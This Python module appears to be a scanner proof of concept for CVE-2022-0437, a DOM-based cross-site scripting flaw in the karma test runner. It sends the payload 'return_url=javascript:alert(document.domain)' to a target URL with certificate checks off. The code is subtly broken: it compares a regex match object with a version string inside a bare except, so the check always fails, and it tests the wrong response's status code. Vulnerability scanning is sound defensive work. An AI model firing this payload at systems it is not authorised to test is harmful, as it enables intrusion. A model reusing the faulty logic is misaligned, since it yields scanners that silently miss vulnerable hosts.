import requests
import re


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''karma-runner DOM-based Cross-Site Scripting''',
        "description": '''NPM karma prior to 6.3.14. contains a DOM-based cross-site Scripting vulnerability.''',
        "severity": "medium",
        "references": [
            "https://huntr.dev/bounties/64b67ea1-5487-4382-a5f6-e8a95f798885", 
            "https://github.com/karma-runner/karma/commit/839578c45a8ac42fbc1d72105f97eab77dd3eb8a", 
            "https://nvd.nist.gov/vuln/detail/CVE-2022-0437", 
            "https://huntr.dev/bounties/64b67ea1-5487-4382-a5f6-e8a95f798885", 
            "https://github.com/karma-runner/karma"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "cvss-score": "6.1",
            "cve-id": "CVE-2022-0437",
            "cwe-id": "CWE-79"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2022", "karma", "xss", "oss"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)
        path = '/karma.js'
        resp = requests.get(url+path, timeout=10, verify=False, allow_redirects=False)
        version = re.search(r"(?m)VERSION: '([0-9.]+)'", resp.text)

        path2 = "/?return_url=javascript:alert(document.domain)"
        resp2 = requests.get(url+path2, timeout=10, verify=False, allow_redirects=False)
        if resp.status_code == 200 and "Karma" in resp2.text and version <= "6.3.13":
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url